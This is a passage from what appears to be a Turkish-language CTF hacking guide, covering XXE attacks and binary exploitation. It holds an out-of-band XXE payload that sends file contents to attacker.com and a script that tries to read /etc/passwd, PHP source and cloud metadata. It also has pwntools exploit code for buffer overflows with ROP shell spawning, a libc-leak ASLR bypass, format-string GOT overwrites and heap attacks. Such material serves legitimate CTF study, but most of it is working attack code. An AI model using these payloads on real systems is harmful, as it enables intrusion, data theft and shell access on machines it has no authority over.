<!-- Veri attacker sunucusuna gönderilir -->

<!-- LEVEL 5: Out-of-band (OOB) XXE -->
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "file:///etc/hostname">
  <!ENTITY % dtd SYSTEM "http://attacker.com/xxe.dtd">
  %dtd;
  %eval;
  %exfil;
]>

<!-- xxe.dtd: -->
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/%xxe;'>">
```

#### XXE Hızlı Test Scripti

```python
import requests

target_url = "http://target.com/xml-upload"

# Test 1: Basit XXE
payload1 = """<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>"""

# Test 2: PHP filter XXE
payload2 = """<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">]>
<root>&xxe;</root>"""

# Test 3: SSRF via XXE
payload3 = """<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<root>&xxe;</root>"""

for i, payload in enumerate([payload1, payload2, payload3], 1):
    response = requests.post(
        target_url,
        data=payload,
        headers={"Content-Type": "application/xml"}
    )
    
    print(f"\n[*] Test {i}:")
    print(f"Status: {response.status_code}")
    print(f"Response snippet: {response.text[:200]}")
    
    if "root:" in response.text or "<?php" in response.text:
        print(f"[+] VULNERABLE to XXE! Test {i} successful!")
```

---

## 2.2 Binary Exploitation (Pwn): Bellek Savaşçısı

### Vizyon: Pwn, Gerçek Hacker Sanatıdır

Binary exploitation, siber güvenliğin "quantum fiziği"dir. Zordur, karmaşıktır, ama bir kez anladığında dünyanın en güçlü saldırganı olursun.

**Pwn'in felsefesi:** Programcının varsaydığı her şeyi kır. "Buffer 64 byte" dedi → 128 byte yolla. "Integer pozitif olmalı" dedi → -1 gönder.

### İşaret Fişekleri: Binary Vulnerability Detektörü

```bash
# Otomatik analiz:
file binary && checksec binary

# Örnek output ve anlamları:

# file binary:
ELF 64-bit LSB executable
# → 64-bit exploitation teknikleri kullan (ROP gadgets x86-64)

dynamically linked
# → libc fonksiyonları kullanılıyor (ret2libc mümkün)

not stripped
# → Debug symbols var (kolay analiz, function isimleri görünür)

# checksec binary:
RELRO: Partial RELRO
# → GOT writable (GOT overwrite saldırısı mümkün)

Stack: No canary found
# → Stack buffer overflow kolay

NX: NX enabled
# → Stack'te shellcode çalışmaz (ROP gerekli)

PIE: No PIE
# → Adresler sabit (exploitation kolaylaşır)
```

### Binary Analiz Hızlı Protokolü (60 Saniye)

```bash
# ADIM 1: File type (5 saniye)
file binary
# 32-bit mi 64-bit mi? Statik mi dinamik mi?

# ADIM 2: Security features (5 saniye)
checksec binary
# Hangi korumalar var?

# ADIM 3: Strings analizi (10 saniye)
strings binary | grep -E "flag|/bin|system|gets|scanf"
# Flag lokasyonu? Tehlikeli fonksiyonlar?

# ADIM 4: Çalıştır ve input noktalarını bul (20 saniye)
./binary
# "Enter your name:" → Input noktası bulundu
# Test: 200 'A' karakteri gönder
python -c 'print("A"*200)' | ./binary
# Segfault? → Buffer overflow var!

# ADIM 5: Dinamik analiz kararı (20 saniye)
ltrace ./binary    # Library calls
strace ./binary    # System calls
# malloc/free görüyorsan → Heap exploitation
# strcpy/gets görüyorsan → Stack overflow
# printf görüyorsan → Format string
```

### 2.2.1 Stack Buffer Overflow: Klasik Ama Ölümcül

#### Mantık: Stack Nasıl Çalışır?

```
Stack Layout (Basitleştirilmiş):

Yüksek Adres
├─────────────┤
│   Arg 2     │  ← Fonksiyon argümanları
├─────────────┤
│   Arg 1     │
├─────────────┤
│ Return Addr │  ← RIP (Instruction Pointer) buraya dönecek
├─────────────┤
│ Saved RBP   │  ← Eski base pointer
├─────────────┤
│  Buffer[64] │  ← Bizim dolduracağımız buffer
│             │
│    (...)    │
├─────────────┤
Düşük Adres

Buffer overflow:
Buffer[64]'e 200 byte yazdık →
Buffer taşar → Saved RBP'yi ezer → Return Addr'i ezer →
Return Addr'i kontrol edersek → RIP'i istediğimiz yere yönlendirebiliriz!
```

#### 5-Dakikalık Exploit Geliştirme: Adım Adım

```python
#!/usr/bin/env python3
from pwn import *

# ADIM 1: Offset bulma (30 saniye)
io = process('./vulnerable_binary')

# Cyclic pattern oluştur
pattern = cyclic(200)
io.sendline(pattern)
io.wait()

# Crash log:
core = io.corefile
rip_value = core.read(core.rsp, 8)  # RIP'in değeri
offset = cyclic_find(rip_value)
log.success(f"Offset to RIP: {offset}")

# ADIM 2: Kontrolü test et (30 saniye)
io = process('./vulnerable_binary')
payload = b'A' * offset + p64(0xdeadbeef)
io.sendline(payload)
io.wait()
# RIP = 0xdeadbeef olmalı (gdb ile kontrol et)

# ADIM 3: Gadget'leri bul (1 dakika)
elf = ELF('./vulnerable_binary')
rop = ROP(elf)

pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
pop_rsi_r15 = rop.find_gadget(['pop rsi', 'pop r15', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]

log.info(f"pop rdi gadget: {hex(pop_rdi)}")

# ADIM 4: Adresleri bul (1 dakika)
system_plt = elf.plt['system']
binsh = next(elf.search(b'/bin/sh'))

log.info(f"system@plt: {hex(system_plt)}")
log.info(f"/bin/sh: {hex(binsh)}")

# ADIM 5: Exploit (2 dakika)
io = process('./vulnerable_binary')

payload = flat([
    b'A' * offset,
    ret,              # Stack alignment (ÖNEMLİ!)
    pop_rdi,
    binsh,
    system_plt
])

io.sendline(payload)
io.interactive()  # Shell alındı!

# Toplam süre: 5 dakika
```

#### Stack Alignment Problemi ve Çözümü

Modern sistemlerde (Ubuntu 18.04+), `movaps` gibi SSE instructionlar stack'in 16-byte aligned olmasını bekler.

```python
# Problem:
payload = flat([
    b'A' * offset,
    pop_rdi,      # RIP buraya gelir
    binsh,
    system_plt    # system() çağrılır ama...
])
# Crash! Neden? Stack 16-byte aligned değil

# Çözüm: Bir tane daha "ret" gadget ekle
payload = flat([
    b'A' * offset,
    ret,          # ← Bu satır stack'i align eder
    pop_rdi,
    binsh,
    system_plt
])
# Şimdi çalışır!
```

#### ASLR Bypass: Libc Leak Tekniği

ASLR açıksa (Address Space Layout Randomization), libc adresleri her çalıştırmada değişir. O zaman:

```python
# 2-Stage Exploit

# STAGE 1: Libc adresini sızdır
io = process('./vulnerable_binary')

payload_stage1 = flat([
    b'A' * offset,
    pop_rdi,
    elf.got['puts'],    # puts() fonksiyonunun GOT adresi
    elf.plt['puts'],    # puts() çağır (kendi adresini yazdıracak)
    elf.symbols['main'] # main()'e dön (ikinci exploit için)
])

io.sendlineafter(b'Input: ', payload_stage1)

# Leaked address:
io.recvline()  # İlk satırı skip et
leaked_puts = u64(io.recvline().strip().ljust(8, b'\x00'))
log.success(f"Leaked puts@libc: {hex(leaked_puts)}")

# Libc base hesapla:
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc_base = leaked_puts - libc.symbols['puts']
log.success(f"Libc base: {hex(libc_base)}")

# system() ve /bin/sh hesapla:
system_addr = libc_base + libc.symbols['system']
binsh_addr = libc_base + next(libc.search(b'/bin/sh'))

# STAGE 2: Gerçek exploit
payload_stage2 = flat([
    b'A' * offset,
    ret,
    pop_rdi,
    binsh_addr,
    system_addr
])

io.sendlineafter(b'Input: ', payload_stage2)
io.interactive()  # Shell!
```

### 2.2.2 Format String Vulnerability: Printf'in Karanlık Yüzü

#### Temel Konsept

```c
// VULNERABLE:
char buffer[100];
fgets(buffer, sizeof(buffer), stdin);
printf(buffer);  // ← Kullanıcı inputu direkt printf'e!

// SAFE:
printf("%s", buffer);

// Saldırı:
Input: "AAAA %x %x %x %x"
Output: AAAA 804a000 bffff764 41414141 20782520
#                                 ^^^^
#                                 Bu bizim "AAAA" (41 = 'A')
# Demek ki input stack'te 3. pozisyonda!
```

#### Format String ile Yapabilecekler

```python
# 1. Memory Read (Leak)
payload = "%3$p"      # 3. stack argümanını oku
payload = "%7$s"      # 7. pozisyondaki adreste string oku

# 2. Memory Write
# %n: Şimdiye kadar yazılan byte sayısını belirtilen adrese yaz
target_addr = 0x08049800
payload = p32(target_addr) + "%10$n"
# 4 byte yazdık (adres) → target_addr'e 4 yazıldı

# 3. Arbitrary Value Yazma
# Örnek: 0x08049800 adresine 0xdeadbeef yazmak
target = 0x08049800
value = 0xdeadbeef  # 3735928559 decimal

payload = p32(target) + f"%{value-4}c%10$n".encode()
# value-4 çünkü adres zaten 4 byte yazdı

# 4. GOT Overwrite
# puts@GOT'u system() ile değiştir
got_puts = elf.got['puts']
system_addr = 0x08048500

payload = p32(got_puts) + f"%{system_addr-4}c%10$n".encode()
# Artık puts() çağrısı system() çağrısına dönüştü!
```

#### pwntools ile Otomatik Format String Exploitation

```python
from pwn import *

context.log_level = 'info'

io = process('./format_string_vuln')
elf = ELF('./format_string_vuln')

# Otomatik format string saldırısı
def send_payload(payload):
    io.sendline(payload)
    return io.recvline()

autofmt = FmtStr(execute_fmt=send_payload)

# GOT overwrite: puts@GOT → system()
autofmt.write(elf.got['puts'], elf.symbols['system'])
autofmt.execute_writes()

# Artık puts("/bin/sh") aslında system("/bin/sh") çalıştırır
io.sendline(b'/bin/sh')
io.interactive()
```

### 2.2.3 Heap Exploitation: İleri Seviye Arena

#### Heap Temel Yapısı

```
Heap Chunk Structure:

┌─────────────────┐
│   Prev Size     │  ← Önceki chunk'ın boyutu (eğer free ise)
├─────────────────┤
│     Size        │  ← Bu chunk'ın boyutu (son 3 bit: flags)
├─────────────────┤
│   User Data     │  ← Kullanıcının yazdığı veri
│                 │
│      ...        │
├─────────────────┤
│   Next Chunk    │
└─────────────────┘

Size flags (son 3 bit):
- P (PREV_INUSE): Önceki chunk kullanımda mı?
- M (IS_MMAPPED): mmap ile mi ayrıldı?
- N (NON_MAIN_ARENA): Ana arena'da değil mi?
```

#### Tcache Poisoning (Libc < 2.29)

```python
# Tcache: Small chunk'lar için hızlı cache (7 chunk'a kadar)

# Saldırı senaryosu:
# 1. İki chunk alloc et
# 2. İkisini de free et (tcache'e gider)
# 3. Double free (aynı chunk'ı iki kez free et)
# 4. tcache->next pointer'ı manipüle et

from pwn import *

io = process('./heap_challenge')

# Adım 1: Allocate
io.sendline(b'1')  # malloc(0x80)
io.sendline(b'1')  # malloc(0x80)

# Adım 2: Free
io.sendline(b'2')  # free(chunk1)
io.sendline(b'2')  # free(chunk2)

# Adım 3: Double free (eğer mümkünse)
io.sendline(b'2')  # free(chunk1) again

# Adım 4: Allocate ve tcache->next'i değiştir
target_addr = 0x404040  # Buraya chunk almak istiyoruz
io.sendline(b'1')       # Allocate (ilk freed chunk'ı alır)
io.sendline(p64(target_addr))  # tcache->next = target_addr

# Adım 5: İki kez daha allocate
io.sendline(b'1')  # Normal chunk
io.sendline(b'1')  # target_addr'deki "chunk"

# Şimdi target_addr'e yazabiliyoruz!
io.interactive()
```

#### Heap Overflow: Chunk Metadata Manipulation

```python
# Senaryo: Heap overflow ile next chunk'ın metadata'sını ezeriz

# Chunk layout:
# [Chunk A: 0x80 bytes] [Chunk B: 0x80 bytes]

# Eğer Chunk A'ya 0x90 byte yazarsak:
# → Chunk B'nin size field'ını ezeriz
# → Chunk B'yi free edersek, yanlış size kullanılır
# → Overlapping chunks elde ederiz

# Exploitation:
# 1. Chunk A ve B alloc et
alloc(0x80, b'A')  # Chunk A
alloc(0x80, b'B')  # Chunk B

# 2. Chunk A'ya overflow yap
payload = b'A' * 0x80  # Chunk A'nın user data'sı
payload += p64(0)      # Chunk B'nin prev_size (fake)
payload += p64(0x91)   # Chunk B'nin size'ını değiştir (0x80 → 0x90)

edit(0, payload)

# 3. Chunk B'yi free et
free(1)  # Chunk B free edildi, ama size yanlış (0x90)

# 4. Yeni chunk alloc et
alloc(0x80, b'C')  # Bu chunk, Chunk B'nin başına gelir
alloc(0x10, b'D')  # Bu chunk, Chunk B'nin içinde!

# Sonuç: Chunk C ve D overlap ediyor
# Chunk C'ye yazarsak, Chunk D'nin datasını değiştiririz
```

---

*[Devam ediyor...]*

Bu rehberin devamında:
- Crypto saldırıları (RSA, AES, XOR)
- Forensics teknikleri (PCAP, Memory, Stego)
- Reverse Engineering (Ghidra, GDB, Anti-debugging)
- Modern araçlar ve automation
- Psikolojik dayanıklılık
- Gerçek CTF senaryoları

---

*Not: Bu rehber çalışma halindedir ve güncellenmektedir. Her bölüm, yıllarca CTF deneyiminin kristalleşmiş halidir. Sabırla oku, pratik yap, ustalaş.*